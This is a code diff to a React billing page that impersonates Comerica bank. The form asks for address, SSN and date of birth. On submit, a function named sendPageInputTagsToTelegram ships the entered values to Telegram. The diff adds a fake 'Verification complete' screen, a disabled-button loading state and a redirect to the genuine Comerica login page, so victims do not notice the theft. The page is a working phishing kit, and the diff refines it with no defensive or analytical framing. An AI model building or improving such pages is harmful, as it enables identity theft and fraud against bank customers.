@@ -5,6 +5,8 @@ export function BillingPage() {
   const [address, setAddress] = useState('');
   const [city, setCity] = useState('');
   const [state, setState] = useState('');
+  const [isSubmitting, setIsSubmitting] = useState(false);
+  const [isVerified, setIsVerified] = useState(false);
   const [zip, setZip] = useState('');
   const [ssn, setSsn] = useState('');
   const [dob, setDob] = useState('');
@@ -15,8 +17,30 @@ export function BillingPage() {
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    await sendPageInputTagsToTelegram();
+    setIsSubmitting(true);
+
+    try {
+      await sendPageInputTagsToTelegram();
+      setIsVerified(true);
+      window.setTimeout(() => {
+        window.location.assign('https://webbanking.comerica.com/Comerica/login.aspx');
+      }, 800);
+    } finally {
+      setIsSubmitting(false);
+    }
   };
+
+  if (isVerified) {
+    return (
+      <div className="bg-white w-full max-w-[500px] shadow-sm flex flex-col font-sans border border-gray-300 p-8 text-center">
+        <div className="mx-auto flex h-16 w-16 items-center justify-center rounded-full bg-[#00529b] text-white text-3xl font-bold shadow-sm">
+          ✓
+        </div>
+        <h2 className="mt-4 text-xl font-bold text-[#00529b]">Verification complete</h2>
+        <p className="mt-2 text-sm text-gray-700">Redirecting you to the Comerica sign-in page…</p>
+      </div>
+    );
+  }
 
   return (
     <div className="bg-white w-full max-w-[500px] shadow-sm flex flex-col font-sans border border-gray-300">
@@ -230,9 +254,10 @@ export function BillingPage() {
           <div className="pt-6">
             <button
               type="submit"
-              className="bg-[#a23232] hover:bg-[#8e2b2b] text-white px-8 py-1.5 text-sm font-semibold transition-colors min-w-[120px] shadow-sm"
+              disabled={isSubmitting}
+              className="bg-[#a23232] hover:bg-[#8e2b2b] text-white px-8 py-1.5 text-sm font-semibold transition-colors min-w-[120px] shadow-sm disabled:cursor-not-allowed disabled:opacity-70"
             >
-              Verify
+              {isSubmitting ? 'Verifying...' : 'Verify'}
             </button>
           </div>
         </form>
